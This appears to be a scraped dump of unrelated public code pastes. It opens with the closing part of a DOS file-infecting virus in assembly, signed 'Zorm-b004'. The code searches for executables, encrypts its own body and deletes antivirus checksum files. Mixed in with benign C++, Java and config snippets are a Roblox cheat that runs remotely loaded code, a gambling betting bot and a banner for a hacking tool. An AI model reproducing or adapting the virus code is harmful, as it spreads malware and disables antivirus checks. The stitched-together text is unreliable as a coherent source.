                 mov ax,100h
                 push ax
                 ret
finish_exe:
                  mov ax,es
                  add ax,10h

set_cs_of_host_to_run_it:                  
                  add word ptr cs:[old_cs+bp],ax
set_stack_of_host:
                  cli
                  add ax,word ptr cs:[bp+old_ss]
                  mov ss,ax                     
                  mov sp,word ptr cs:[bp+old_sp]
                  sti
go_to_host_code:
                  db 0eah     ; :=jmp xxxx:yyyy
old:
                  old_ip dw 0 ;            yyyy 
                  old_cs dw 0 ;       xxxx 
                  old_sp dw 0
                  old_ss dw 0
store:
                  store_ip dw 0
                  store_cs dw 0fff0h
                  store_sp dw 0
                  store_ss dw 0fff0h

;-----------------------------------
;search in current directory.

search:
                  mov ah,4eh
                  cmp byte ptr [flag_com+bp],'C'
                  jnz its_exe
                  lea dx,com_file+bp
                  jmp its_com
        its_exe:
                  lea dx,file_mask+bp
        its_com:
                  mov cx,7
                  int 21h
                  ret
search_again:
                  mov ah,4fh
                  int 21h
                  ret
;-----------------------------------





;-----------------------------------
;change directory to parent dir.

up_dir:
                  mov ah,3bh
                  lea dx,dot_dot+bp
                  int 21h
                  ret
;-----------------------------------





;-----------------------------------
;find the next dir in dos path
;and set current dir=dir found.

change_path_dir:  

                  lea si,new_dir+bp
        notyet:   
                  cmp byte ptr es:[di],';'
                  jz _end 
                  cmp byte ptr es:[di],0
                  jz _end2
                  mov ah,byte ptr es:[di]
                  mov byte ptr [si],ah
                  inc di
                  inc si
                  jmp notyet
                  _end:
                       mov byte ptr [si],0
                       inc di
                  mov ah,3bh
                  lea dx,new_dir+bp
                  int 21h 
                  ret
                  _end2:
                   xor ax,ax
                         ret
;------------------------------------------


 encrypt:
                  push ax
                  push bx
 
change_xor_value:
                  mov al,byte ptr [_al+bp]
                  inc al
                  cmp al,0
                  jne more
                  inc al
             more:
                  mov byte ptr [_al+bp],al
                  
                  mov ah,byte ptr [value+bp]
                  
                  inc ah
                  cmp ah,0  	
                  jne again
                  inc ah
             again:
                  mov byte ptr [value+bp],ah


 copy_virus_to_queue_buffer:
                  ;cld                 
                  push di
                  push es
                  push cs
                  pop es
                  lea si,start+bp
                  lea di,queue+bp
                  mov cx,end_virus-start
                  rep movsb
                  pop es
                  pop di
crypt_main_part_of_virus_in_buffer:
                  
                  mov cx,end_main-begin_main
                  lea bx,queue+(begin_main-start)+bp
                  call crypt
                  xchg al,ah

                  inc al
                  inc al
crypt_2nd_part_of_virus_in_buffer:

                                   mov cx,end_2nd-begin_2nd
                                   lea bx,queue+(begin_2nd-start)+bp
                                   call crypt
  
                                   pop bx
                                   pop ax
                                   ret
set_attrib:
                  mov ax,4301h
                  xor cx,cx
                  int 21h
                  ret
kill_file:
                  mov ah,41h
                  int 21h
                  ret
int_24h:
                  mov al,3
                  iret
set_dta:
                  mov ah,1ah
                  int 21h
                  ret
compute_delta:
                  call delta
        delta:
                  pop bp
                  sub bp,offset delta
                  ret
       go_end:
                  mov ax,4202h
                  xor cx,cx 
                  cwd
                  int 21h
                  ret
                  
                  signature db  '(c)Zorm-b004 by Dr.L  March/July98'      
                  jmp_bytes db  0e9h,0,0,'V'
                store_bytes db  90h,90h,0cdh,20h                
                  killfile1 db 'anti-vir.dat',0
                  killfile2 db 'chklist.ms'  ,0
                  killfile3 db 'chklist.cps' ,0
                    dot_dot db '..',0
                  file_mask db 'goat*.exe',0    ;anti-lamer routine
                   com_file db 'goat*.com',0  
                  
end_main:
 

end_virus:
                     com_target db            ?
                     com_virus  db            ?
                      flag_com  db            ? 
                          disk  db            ?  
                     attribute  dw            ?
                    old_int24h  dd            ?              
                           _ds  dw            ?
                  count_infect  db            ?
                         slash  db            ?
                   current_dir  db  64  dup  (?)
                    exe_header  db  1ch dup  (?)
                       new_dta  db  43  dup  (?)
                       new_dir  db  64  dup  (?)
    queue: 
end start1                                  "
y9LLjYVk,Untitled,Salvens,C++,Friday 16th of June 2023 08:35:36 AM CDT,"#include <algorithm>
#include <iostream>
#include <iomanip>
#include <cmath>
#include <vector>
#include <set>
//#include <map>
//#include <string>
//#include <cassert>
//#include <numeric>
//#include <queue>
//#include <cstdint>
using namespace std;

//#define int long long
#define IOS ios::sync_with_stdio(false); cin.tie(0); cout.tie(0);

const long long INF = 1e18 + 7;
const double EPS = 1e-9;
const int N = 110;
const int MOD = 1e9 + 7;

struct segtree {

    vector<long long> tree;
    int size;

    const int NO_OPERATION = -INF;

    void Init(int n) {
        size = 1;
        while (size < n) {
            size *= 2;
        }
//        tree.assign(2 * size - 1, 0);
        tree.resize(2 * size -1, 0);
        fill(tree.begin(), tree.end(), 0);
    }

    void propagate(int x, int lx, int rx) {
        if (tree[x] == NO_OPERATION) {
            return;
        }
        if (rx - lx == 1) {
            return;
        }
        tree[2 * x + 1] = tree[x];
        tree[2 * x + 2] = tree[x];
        tree[x] = NO_OPERATION;
    }

    void modify(int l, int r, int v, int x, int lx, int rx) {
        propagate(x, lx, rx);
        if (l >= rx || lx >= r) {
            return;
        }
        if (lx >= l && rx <= r) {
            tree[x] = v;
            return;
        }
        int m = (lx + rx) / 2;
        modify(l, r, v, 2 * x + 1, lx, m);
        modify(l, r, v, 2 * x + 2, m, rx);
    }

    void modify(int l, int r, int v) {
        modify(l, r, v, 0, 0, size);
    }

    long long get(int i, int x, int lx, int rx) {
        propagate(x, lx, rx);
        if (rx - lx == 1) {
            return tree[x];
        }
        int m = (lx + rx) / 2;
        if (i < m) {
            return get(i, 2 * x + 1, lx, m);
        } else {
            return get(i, 2 * x + 2, m, rx);
        }
    }

    long long get(int i) {
        return get(i, 0, 0, size);
    }

};

/*inline*/ void solve() {
    int n, m;
    cin >> n >> m;
    vector<int> a(m * 2 + 1), c(2 * m + 1);
    cin >> a[1] >> a[2] >> c[1];
    int x, y, z;
    cin >> x >> y >> z;
    c[2] = (c[1] * x + z * y) % n + 1;
    for (int i = 3; i <= m * 2; ++i) {
        a[i] = (x * a[i - 2] + y * a[i - 1] + z) % n + 1;
        c[i] = (c[i - 1] * x + z * y) % n + 1;
    }

    segtree st;
    st.Init(n);
    for (int i = 1; i <= m; ++i) {
        int l = min(a[2 * i - 1], a[2 * i]), r = max(a[2 * i - 1], a[2 * i]), v = c[i];
        st.modify(l - 1, r, v);
    }
    for (int i = 0; i < n; ++i) {
        cout << st.get(i) << ' ';
    }
    cout << '\n';
}

int32_t main() {
    IOS;

    int tt = 1;
//    cin >> tt;
    while (tt--) {
        solve();
    }
    return 0;
}

/*
1.  数组开够了没
2.  文件名写对了没，文件夹建了吗
3.  内存会不会MLE
4.  多测清空？
5.  调试删干净了没
6.  取模有没有溢出
7.  快速幂底数要取模，幂对 mod-1 取模
8.  前向星和欧拉序要开2倍数组
9.  比较函数如果值相同的话有没有第二优先级
10. 线段树 4 倍空间，线段树合并和可持久化线段树 32 倍空间
11. 看清楚 log 的底数是啥，log后面的数是啥
12. long long 只有正负 2^63-1
*/"
WbMVVMfA,startup.lua,kineticcat_,Lua,Friday 16th of June 2023 08:20:58 AM CDT,"global ws err = http.websocket(""176.249.156.217"")

if err then
    print(err)
elseif ws then
    print(ws.recive())"
uV0zNjd4,Untitled,Lyubov,Bash,Friday 16th of June 2023 08:01:49 AM CDT,"npm ERR! code ERESOLVE
npm ERR! ERESOLVE could not resolve
npm ERR!
npm ERR! While resolving: dagre-d3-react@0.2.4
npm ERR! Found: react@17.0.2
npm ERR! node_modules/react
npm ERR!   react@""^17.0.2"" from the root project
npm ERR!   peer react@""^16.8.0 || ^17.0.0"" from @material-ui/core@4.11.4
npm ERR!   node_modules/@material-ui/core
npm ERR!     @material-ui/core@""^4.11.4"" from the root project
npm ERR!     peer @material-ui/core@""^4.0.0"" from @material-ui/icons@4.11.2
npm ERR!     node_modules/@material-ui/icons
npm ERR!       @material-ui/icons@""^4.11.2"" from the root project
npm ERR!   16 more (@material-ui/icons, @material-ui/styles, ...)
npm ERR!
npm ERR! Could not resolve dependency:
npm ERR! peer react@""16.9.0"" from dagre-d3-react@0.2.4
npm ERR! node_modules/dagre-d3-react
npm ERR!   dagre-d3-react@""^0.2.4"" from the root project
npm ERR!
npm ERR! Conflicting peer dependency: react@16.9.0
npm ERR! node_modules/react
npm ERR!   peer react@""16.9.0"" from dagre-d3-react@0.2.4
npm ERR!   node_modules/dagre-d3-react
npm ERR!     dagre-d3-react@""^0.2.4"" from the root project
npm ERR!
npm ERR! Fix the upstream dependency conflict, or retry
npm ERR! this command with --force or --legacy-peer-deps
npm ERR! to accept an incorrect (and potentially broken) dependency resolution.
npm ERR!
npm ERR!
npm ERR! For a full report see:
npm ERR! C:\Users\admin\AppData\Local\npm-cache\_logs\2023-06-16T12_53_36_606Z-eresolve-report.txt

npm ERR! A complete log of this run can be found in:
npm ERR!     C:\Users\admin\AppData\Local\npm-cache\_logs\2023-06-16T12_53_36_606Z-debug-0.log"
YbVniPqS,Disable system settings for user on Android through ADB,metalx1000,Bash,Friday 16th of June 2023 07:54:49 AM CDT,"#get package name - run this command and start app
logcat|grep cmp

#diable system settings for user
pm disable-user com.android.settings

#enable system settings
pm enable com.android.settings"
yUpB7bsF,yes,Tumppi68,Lua,Friday 16th of June 2023 07:49:34 AM CDT,"--Made by tupsutumppu#3145
local DiscordLib = loadstring(game:HttpGet(""https://raw.githubusercontent.com/dawid-scripts/UI-Libs/main/discord%20lib.txt""))()
local win = DiscordLib:Window(""PTFS Plane Speed Modifier"")
local serv = win:Server(""super op script"", """")
local maxSpeedChannel = serv:Channel(""Max Speed"")
local accelerationChannel = serv:Channel(""Acceleration"")

local settings = {
    maxSpeed = nil,
    acceleration = nil
}

local function mod(target, value)
    for _, v in pairs(getgc()) do
        if type(v) == ""function"" and tostring(getfenv(v).script) == ""Control"" then
            local upvalues = debug.getupvalues(v)
            for i, upvalue in pairs(upvalues) do
                if upvalue == target then
                    debug.setupvalue(v, i, value)
                    local str = ""Original value: "" .. tostring(target) .. "" | New Value: "" .. tostring(value)
                    DiscordLib:Notification(""Success!"" ,str, ""Close"")
                end
            end
            break
        end
    end
end

maxSpeedChannel:Textbox(""MaxSpeed"", ""Type here!"", true, function(text)
    settings.maxSpeed = tonumber(text) or settings.maxSpeed
end)

maxSpeedChannel:Button(""Apply New MaxSpeed"", function()
    if settings.maxSpeed ~= nil then
        local seatPart = game.Players.LocalPlayer.Character.Humanoid.SeatPart
        if seatPart then
            local fullName = seatPart:GetFullName()
            local secondName = fullName:split(""."")[3]
            local maxSpeedValue = game.Workspace.Aircraft[tostring(secondName)]:GetAttribute(""MaxSpeed"")
            mod(maxSpeedValue, settings.maxSpeed)
        else
            DiscordLib:Notification(""Notification"", ""Must be in a plane!"", ""Close"")
        end
    else
        DiscordLib:Notification(""Notification"", ""MaxSpeed cannot be 'nil'. Did you forget to press 'Enter' after providing a value?"", ""Close"")
    end
end)

accelerationChannel:Textbox(""Acceleration"", ""Type here!"", true, function(text)
    settings.acceleration = tonumber(text) or settings.acceleration
end)

accelerationChannel:Button(""Apply New Acceleration"", function()
    if settings.acceleration ~= nil then
        local seatPart = game.Players.LocalPlayer.Character.Humanoid.SeatPart
        if seatPart then
            local fullName = seatPart:GetFullName()
            local secondName = fullName:split(""."")[3]
            local accelerationValue = game.Workspace.Aircraft[tostring(secondName)]:GetAttribute(""Acceleration"")
            mod(accelerationValue, settings.acceleration)
        else
            DiscordLib:Notification(""Notification"", ""Must be in a plane!"", ""Close"")
        end
    else
        DiscordLib:Notification(""Notification"", ""Acceleration cannot be 'nil'. Did you forget to press 'Enter' after providing a value?"", ""Close"")
    end
end)"
MgQFHnpe,Untitled,Merry123,Java,Friday 16th of June 2023 07:48:01 AM CDT,"package Exercises;

import java.sql.Connection;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.util.Scanner;

public class AddMinion {
    private static Connection connection;
    public static void main(String[] args) throws SQLException {
         connection = Utils.getConnection();

        Scanner sc = new Scanner(System.in);

        String[] minionInfo = sc.nextLine().split(""\\s+"");
        String minionName = minionInfo[1];
        int minionAge = Integer.parseInt(minionInfo[2]);
        String minionTown = minionInfo[3];
        String villainName = sc.nextLine().split(""\\s+"")[1];


        addTownIfItDoesntExist(minionTown);
        addVillainIfItDoesntExist(villainName);
        addMinion(minionName, minionAge, minionTown);
        setVillainToMinion(minionName, villainName);

    }

    private static void setVillainToMinion(String minionName, String villainName) throws SQLException {
        PreparedStatement preparedStatement = connection
                .prepareStatement(""INSERT INTO minions_villains VALUES (?, ?);"");
        int minionId = getMinionId(minionName);
        int villainId = getVillainId(villainName);
        preparedStatement.setInt(1, minionId);
        preparedStatement.setInt(2, villainId);
        preparedStatement.executeUpdate();

        System.out.printf(""Successfully added %s to be minion of %s.%n"", minionName, villainName);
    }

    private static int getVillainId(String villainName) throws SQLException {
        PreparedStatement preparedStatement = connection
                .prepareStatement(""SELECT DISTINCT id FROM villains WHERE name = ?"");
        preparedStatement.setString(1, villainName);
        ResultSet resultSet = preparedStatement.executeQuery();

        resultSet.next();

        return resultSet.getInt(1);
    }

    private static int getMinionId(String minionName) throws SQLException {
        PreparedStatement preparedStatement = connection.prepareStatement(""SELECT DISTINCT id FROM minions WHERE name = ?"");
        preparedStatement.setString(1, minionName);
        ResultSet resultSet = preparedStatement.executeQuery();

        resultSet.next();
        return resultSet.getInt(1);
    }

    private static void addMinion(String minionName, int minionAge, String minionTown) throws SQLException {
        PreparedStatement addMinion = connection
                .prepareStatement(""INSERT INTO minions(name, age, town_id) VALUES(?, ?, ?)"");
        addMinion.setString(1, minionName);
        addMinion.setInt(2, minionAge);
        addMinion.setInt(3, getTownIdByName(minionTown));

        addMinion.executeUpdate();
    }

    private static int getTownIdByName(String minionTown) throws SQLException {
        PreparedStatement preparedStatement = connection
                .prepareStatement(""SELECT DISTINCT id FROM towns WHERE name = ?;"");

        preparedStatement.setString(1, minionTown);

        ResultSet resultSet = preparedStatement.executeQuery();

        resultSet.next();

        return resultSet.getInt(1);
    }

    private static void addVillainIfItDoesntExist(String villainName) throws SQLException {
        if (checkIfVillainExists(villainName)) {
            PreparedStatement addVillain = connection
                    .prepareStatement(""INSERT INTO villains(name, evilness_factor) VALUES(?, ?)"");
            addVillain.setString(1, villainName);
            addVillain.setString(2, ""evil"");

            addVillain.executeUpdate();

            System.out.printf(""Villain %s was added to the database.%n"", villainName);
        }
    }

    private static boolean checkIfVillainExists(String villainName) throws SQLException {
        PreparedStatement preparedStatement = connection
                .prepareStatement(""SELECT DISTINCT COUNT(*) FROM villains WHERE name = ?"");

        preparedStatement.setString(1, villainName);
        ResultSet resultSet = preparedStatement.executeQuery();

        resultSet.next();

        return resultSet.getInt(1) == 0;
    }

    private static void addTownIfItDoesntExist(String minionTown) throws SQLException {
        if (checkIfTownExists(minionTown)) {
            PreparedStatement preparedStatement = connection
                    .prepareStatement(""INSERT INTO towns(name) VALUES(?);"");
            preparedStatement.setString(1, minionTown);

            preparedStatement.executeUpdate();

            System.out.printf(""Town %s was added to the database.%n"", minionTown);
        }
    }

    private static boolean checkIfTownExists(String minionTown) throws SQLException {
        PreparedStatement preparedStatement = connection
                .prepareStatement(""SELECT DISTINCT COUNT(*) FROM towns WHERE name = ?"");

        preparedStatement.setString(1, minionTown);
        ResultSet resultSet = preparedStatement.executeQuery();

        resultSet.next();

        return resultSet.getInt(1) == 0;
    }
}"
uBJJVdKF,Open App Settings from adb shell,metalx1000,Bash,Friday 16th of June 2023 07:47:18 AM CDT,"#open App Settings from adb shell on Android

#example from adb shell
am start -a android.settings.APPLICATION_DETAILS_SETTINGS package:com.filmsbykris.game

#use fzf filter on desktop
adb shell am start -a android.settings.APPLICATION_DETAILS_SETTINGS ""$(adb shell pm list packages|fzf)"""
x382G361,Untitled,phpface,CSS,Friday 16th of June 2023 07:12:13 AM CDT,"@media only screen and (max-width: 768px) {
    .widget-videos-playlist .post-grid {
        min-height: 600px!important;
    }    
}"
BVT3kTis,CC:Tweaked Mob Farm,timconspicuous,Lua,Friday 16th of June 2023 07:11:43 AM CDT,"-- Monitor setup
local monitor = peripheral.wrap(""top"") -- Replace ""top"" with the side where your monitor is located
monitor.setTextScale(0.5) -- Adjust the text scale as needed

-- Button properties
local buttonX = 1 -- X-coordinate of the top-left corner of the button
local buttonY = 1 -- Y-coordinate of the top-left corner of the button
local buttonWidth = 10 -- Width of the button
local buttonHeight = 5 -- Height of the button

-- Button state
local isButtonOn = false -- Initial state of the button (red)

-- Function to draw the button
local function drawButton()
  monitor.setBackgroundColor(colors.red)
  monitor.clear()
  monitor.setCursorPos(buttonX, buttonY)
  monitor.setTextColor(colors.white)
  
  for i = 1, buttonHeight do
    monitor.setCursorPos(buttonX, buttonY + i - 1)
    monitor.write(string.rep("" "", buttonWidth))
  end
  
  monitor.setCursorPos(buttonX + math.floor((buttonWidth - 3) / 2), buttonY + math.floor((buttonHeight - 1) / 2))
  monitor.write(isButtonOn and ""ON"" or ""OFF"")
end

-- Function to toggle the button state and redstone signal
local function toggleButton()
  isButtonOn = not isButtonOn
  drawButton()
  
  -- Toggle redstone signal on the right side of the computer
  rs.setOutput(""right"", isButtonOn)
end

-- Main program loop
while true do
  local event, side, xPos, yPos = os.pullEvent(""monitor_touch"")
  
  -- Check if the touch event occurred within the button boundaries
  if xPos >= buttonX and xPos <= buttonX + buttonWidth - 1 and yPos >= buttonY and yPos <= buttonY + buttonHeight - 1 then
    toggleButton()
  end
end
"
hpJZad51,login,rnsribeiro,JSON,Friday 16th of June 2023 06:56:32 AM CDT,"{
	""Status"":""OK""
}"
vgQrLqE7,Untitled,35657,C++,Friday 16th of June 2023 06:39:47 AM CDT,"#include <iostream>

using namespace std;




template <typename T>
class Stack {
public:
    void Push(const T& element) {
        elements_[size] = element;;
        size++;
    }
    void Pop() {
        size--;;
    }
    const T& Top() const {
        return elements_[size - 1];
    }
    T& Top() {
        return elements_[size - 1];
    }

    int Size() const {
        return size;
    }
    bool Empty() const {
        return size == 0;;
    }

private:
    T elements_[100];
    int size = 0;
};

int main() {
    Stack<int> stack;
    for (uint32_t i = 0; i < 10; ++i) {
        stack.Push(i);
        cout << stack.Top() << endl;
    }
    cout << endl;

    while (!stack.Empty()) {
        cout << stack.Top() << endl;
        stack.Pop();
    }
    cout << endl;
}"
iU4yHyKq,Network Router,openblocki,Lua,Friday 16th of June 2023 06:36:41 AM CDT,"-- Author : Mystical_MechGod aka. openblocki aka. Luc

local server_connection = peripheral.wrap(""back"")
local monitor = peripheral.wrap(""top"")

local y = 1


monitor.write(os.getComputerID)
rednet.open(""front"")

while true do

    local senderId, message, protocol = os.pullEvent(""rednet_message"")

    if message == ""Password"" then
        y= y + 1
        monitor.setCursorPos(1,y)
        monitor.write(senderId)
        server_connection.transmit(1,1,senderId)
        
    end
end"
6s0b9eiH,Untitled,35657,C++,Friday 16th of June 2023 06:36:25 AM CDT,"#include <iostream>

using namespace std;

template <typename T>
class ForwardList {
public:

    ForwardList() : size(0), head(nullptr) {}

    ForwardList(const ForwardList& other) : size(other.size), head(nullptr) {
        if (other.head != nullptr) {
            head = new Node{ other.head->value, nullptr };
            Node* temp = head;
            Node* other_temp = other.head;
            while (other_temp->next != nullptr) {
                other_temp = other_temp->next;
                temp->next = new Node{ other_temp->value, nullptr };
                temp = temp->next;
            }
        }
    }

    /*ForwardList(ForwardList& other) :size(0), head(nullptr) {
        while (size != other.size) {
            Node* temp = other.head;
            for (int i = 0; i != other.size - size - 1; i++) {
                temp = temp->next;
            }
            Push_front(temp->value);
        }
    };*/

    ForwardList(ForwardList&& other) : size(other.size), head(other.head) {
        other.size = 0;
        other.head = nullptr;
    }

    ForwardList& operator=(const ForwardList& other) {
        if (this != &other) {
            Clear();
            if (other.head != nullptr) {
                head = new Node{ other.head->value, nullptr };
                Node* temp = head;
                Node* other_temp = other.head;
                while (other_temp->next != nullptr) {
                    other_temp = other_temp->next;
                    temp->next = new Node{ other_temp->value, nullptr };
                    temp = temp->next;
                }
            }
            size = other.size;
        }
        return *this;
    }

    

    ForwardList& operator=(ForwardList&& other) {
        if (this != &other) {
            Clear();
            size = other.size;
            head = other.head;
            other.size = 0;
            other.head = nullptr;
        }
        return *this;
    }

    void Push_front(const T& value) {
        head = new Node{ value, head };
        size++;
    }

    void Pop_front() {
        if (size > 0) {
            Node* temp = head;
            head = head->next;
            delete temp;
            size--;
        }
    }

    void Print() {
        Node* temp = head;
        while (temp != nullptr) {
            cout << temp->value << "" "";
            temp = temp->next;
        }
        cout << endl;
    }

    int Size() const {
        return size;
    }

    T Front() const {
        if (head != nullptr) {
            return head->value;
        }
    }

    void Clear() {
        while (head != nullptr) {
            Pop_front();
        }
    }

    void Insert(const int index, const int& value) {
        if (index == 0) {
            Push_front(value);
            return;
        }
        if (index > 0 && index < size) {
            Node* temp = head;
            for (int i = 0; i < index - 1; i++) {
                temp = temp->next;
            }
            temp->next = new Node{ value, temp->next };
            size++;
        }
    }

    void Erase(const int index) {
        if (index == 0) {
            Pop_front();
            return;
        }
        if (index > 0 && index < size) {
            Node* temp = head;
            for (int i = 0; i < index - 1; i++) {
                temp = temp->next;
            }
            Node* buf = temp->next->next;
            delete temp->next;
            temp->next = buf;
            size--;
        }
    }

    ~ForwardList() {
        Clear();
    }

private:
    struct Node { //односвязный список состоит из узлов
        T value; // узел хранит информативную часть
        Node* next; // и указатель на следующий узел в списке
    };
    int size = 0;
    Node* head = nullptr;
};

        // реализовать функцию Clear (очистка списка), конструктор по умолчанию, деструктор

int main() {
    ForwardList<int> list1;

    for (int i = 0; i < 10; i++) {
        list1.Push_front(i + 1);
        list1.Print();
    }

    cout << list1.Size() << endl;

    for (int i = 0; i < 3; i++) {
        list1.Pop_front();
        list1.Print();
    }

    list1.Insert(2, 12);

    list1.Print();


    list1.Erase(3);

    list1.Print();

    cout << list1.Size() << endl;

    cout << list1.Front() << endl;

    ForwardList<int> list2;
    
    list2 = move(list1);

    cout << ""list2:"" << endl;

    list2.Print();

    cout << ""list1:"" << endl;

    list1.Print();
}"
eScAPN9Q,Hide all apps in App Draw Lawnchair Android,metalx1000,Bash,Friday 16th of June 2023 06:34:52 AM CDT,"#Hide apps from lawnchair app drawer
#Root Needed
#run the following commands and put the out in
#""/data/data/ch.deletescape.lawnchair.plah/shared_prefs/ch.deletescape.lawnchair.plah/shared_prefs/ch.deletescape.lawnchair.plah_preferences.xml""

echo '<set name=""hidden-app-set"">'
db=""/data/data/ch.deletescape.lawnchair.plah/databases/app_icons.db""
echo ""select componentName from icons;""|sqlite3 ""$db""|while read app;
do
	echo ""<string>$app#0</string>""
done
echo ""</set>""
"
xmxwAcu6,Mini Weather Station,mayerm001,C++,Friday 16th of June 2023 06:32:11 AM CDT,"/*
Mini Local Weather Station
Copyright (c) Mayer Mihály 2023
*/
#include ""SSD1306Wire.h""
#include <ESP8266WiFiMulti.h> 
#include <ESP8266HTTPClient.h>
#include <WiFiClientSecureBearSSL.h>
#include <ArduinoJson.h>
#include ""weather.h"" // weather_sunny, weather_rain, weather_cloud

SSD1306Wire display(0x3c, SCL, SDA); 

const char* googleHost = ""https://www.googleapis.com/geolocation/v1/geolocate"";
const char* GOOGLE_APIKEY = ""key=<Google API key>"";
const char* weatherPage = ""http://api.openweathermap.org/data/2.5/weather?lat=%f&lon=%f&units=metric&APPID=<OpenWeatherMap API ID>"";

double latitude    = 0.0;
double longitude   = 0.0;
char buffer[8];
char sbuffer[256];
char* wbuffer;
String line = """";
String weatherMain = """";
double temperature = 0.0;
double humidity = 0.0;

ESP8266WiFiMulti wifiMulti;
IPAddress ip(192, 168, 0, 99);
IPAddress gateway(192, 168, 0, 1);
IPAddress subnet(255, 255, 255, 0);
IPAddress dns(8, 8, 8, 8);
char WiFiPassword[] = ""<password>"";
char router_ssid_1[] = ""<router1>"";
char router_ssid_2[] = ""<router2>"";
char router_ssid_3[] = ""<router3>"";

unsigned long previousMillis = 0UL;
unsigned long interval = 600000UL;

bool connectToWifi()
{ 
  wifiMulti.addAP(router_ssid_1, WiFiPassword);
  wifiMulti.addAP(router_ssid_2, WiFiPassword);
  wifiMulti.addAP(router_ssid_3, WiFiPassword);
  
  int count = 0;  
  while (wifiMulti.run() != WL_CONNECTED && count++ < 20) {} 
  if (wifiMulti.run() == WL_CONNECTED) {
    WiFi.config(ip, gateway, subnet, dns);
    Serial.println(""Connect to "" + WiFi.SSID()); 
    return true;
  } else {
    Serial.println(""Unable to connect Wifi.""); 
    return false;  
  }
}

void getWeather(String wBuffer)
{
  if (wifiMulti.run() == WL_CONNECTED) {
      DynamicJsonDocument document(1024); 
      WiFiClient client;
      HTTPClient http;
      http.begin(client, wBuffer);
      http.addHeader(""Content-Type"", ""application/x-www-form-urlencoded"");                                    
      int httpResponseCode = http.GET();
      Serial.println(httpResponseCode);
      if (httpResponseCode > 0) {
        if (httpResponseCode == HTTP_CODE_OK || httpResponseCode == HTTP_CODE_MOVED_PERMANENTLY) {
            String response = http.getString();
            Serial.println(response);
            deserializeJson(document, response);
            JsonObject object = document.as<JsonObject>();
            weatherMain = object[""weather""][0][""main""].as<String>();
            temperature = object[""main""][""temp""].as<float>();
            humidity = object[""main""][""humidity""].as<float>();
        }
      }
      http.end();
      client.flush(); 
  }
}

void getLocation()
{
    if (wifiMulti.run() == WL_CONNECTED) {
        DynamicJsonDocument document(1024); 
        HTTPClient http;
        std::unique_ptr<BearSSL::WiFiClientSecure>client(new BearSSL::WiFiClientSecure);
        client->setInsecure();
        http.begin(*client, googleHost);
        http.addHeader(""Content-Type"", ""application/x-www-form-urlencoded"");
        http.addHeader(""Content-Length"", String(sizeof(GOOGLE_APIKEY)));
        http.setTimeout(10000);                      
        int httpResponseCode = http.POST(GOOGLE_APIKEY);
        Serial.println(httpResponseCode);
        if (httpResponseCode > 0) {
          if (httpResponseCode == HTTP_CODE_OK || httpResponseCode == HTTP_CODE_MOVED_PERMANENTLY) {
              String response = http.getString();
              Serial.println(response);
              deserializeJson(document, response);
              JsonObject object = document.as<JsonObject>();
              latitude = object[""location""][""lat""].as<float>();
              longitude = object[""location""][""lng""].as<float>();
              Serial.println(String(latitude) + "","" + String(longitude));
          }
        }
        http.end();
    }
}

void getWeather_and_display()
{
      sprintf(sbuffer,weatherPage,latitude,longitude);
      getWeather(sbuffer);
  	  display.clear();
      sprintf(sbuffer,""%.1f °C"",temperature);
      display.drawString(70, 8, String(sbuffer)); 
      sprintf(sbuffer,""%.1f %%"",humidity);
      display.drawString(70, 40, String(sbuffer));
      weatherMain.toLowerCase();
      if (weatherMain.indexOf(""rain"") >= 0) { 
        display.drawXbm(0, 0, 60, 60, weather_rain);
      } else if (weatherMain.indexOf(""clouds"") >= 0) {
        display.drawXbm(0, 0, 60, 60, weather_cloud);
      } else {
        display.drawXbm(0, 0, 60, 60, weather_sunny);
      }
      display.display(); 
}

void setup() {
  Serial.begin(9600);

  connectToWifi();
  display.init();
  display.clear();
  display.setFont(ArialMT_Plain_16);
  display.setTextAlignment(TEXT_ALIGN_LEFT);
  display.drawVerticalLine(63,0,63);

  getLocation();
  getWeather_and_display();
  previousMillis = millis();
}

void loop() {
  if (wifiMulti.run() != WL_CONNECTED) connectToWifi();
  unsigned long currentMillis = millis();
  if(currentMillis - previousMillis > interval)
  {
      getWeather_and_display();
      previousMillis = currentMillis;
  }
}
"
YTaWxT4A,ascii.txt,FlyFar,GetText,Friday 16th of June 2023 06:30:31 AM CDT," ___   _  _    __    __  _   ___        ___   _  _    ___  _  __ 
| _,\ | || |  /__\  |  \| | | __|  __  | __| | || |  / _/ | |/ / 
| v_/ | >< | | \/ | | | ' | | _|  |__| | _|  | \/ | | \__ |   <  
|_|   |_||_|  \__/  |_|\__| |___|      |_|    \__/   \__/ |_|\_\ 
                    ----------------------------
                    Written In : GO 1.16.2
                    
                    Written By : Scare_Sec_Hackers"
RTGW4XPx,go.mod,FlyFar,Go,Friday 16th of June 2023 06:29:45 AM CDT,"module main

go 1.16

require github.com/fatih/color v1.12.0 // indirect"
sGZpgYw7,Untitled,wclovers,PHP,Friday 16th of June 2023 06:24:38 AM CDT,"add_filter('wcfmmp_free_shipping_threshold_consider_tax','__return_false');"
McmyWFau,Spartan Splash Font,tommyosheawebdesign,CSS,Friday 16th of June 2023 06:22:25 AM CDT,"    font-family: Spartan;
    font-size: 18px;
    line-height: 34px;
    font-weight: 500;"
M0SLsUCv,Money Printer Free,AlsoKnown,Lua,Friday 16th of June 2023 06:19:26 AM CDT,"resetstats()
divider      = 29999
chance1      = math.random(15,65)
chance       = math.floor((chance1*100)+0.5)/100
bethigh      = true
basebet      = balance/divider
nextbet      = basebet
minbetofsite = basebet/10
maxbalance   = balance
loseAmount   = 0
loss         = 0

function dobet() 
if (balance >= maxbalance) then 
    maxbalance = balance
    loseAmount = 0
    if (loss>((99/chance)*10+(99/chance)+((99/chance)/1.3))/6) then
        if (math.random(100,10000)%3==0) then 
            chance = math.random(chance+10,chance+20) 
        else 
            chance = math.random(chance-20,chance-10) 
        end
    end
    if (math.random(1,2)==1) then 
        bethigh = (not bethigh) 
    end
    nextbet = balance/divider;minbetofsite=nextbet/10 
else 
    loseAmount = maxbalance-balance;nextbet=loseAmount/(99/chance-1)
    if (loss>((99/chance)*10+(99/chance)+((99/chance)/1.3))/6) then 
        chance = math.random(1,50)
        if (chance<=30) then nextbet=loseAmount/(99/chance-1)
    else
        if (chance<=35) then
            if (math.random(1,2)==1) then 
                nextbet = loseAmount/(99/chance-1)/1.3 
            else 
                nextbet = loseAmount/(99/chance-1) 
            end
        else
            nextbet = loseAmount/(99/chance-1)/1.5
        end
    end
 end
end
if win then loss=0 else loss=loss+1 end
if (chance<=10) or (chance>=60) then chance = math.random(15,65) end
if (nextbet>(loseAmount/(99/chance-1))) then nextbet=loseAmount/(99/chance-1) end
if (currentstreak == -5) then chance=84.84 end
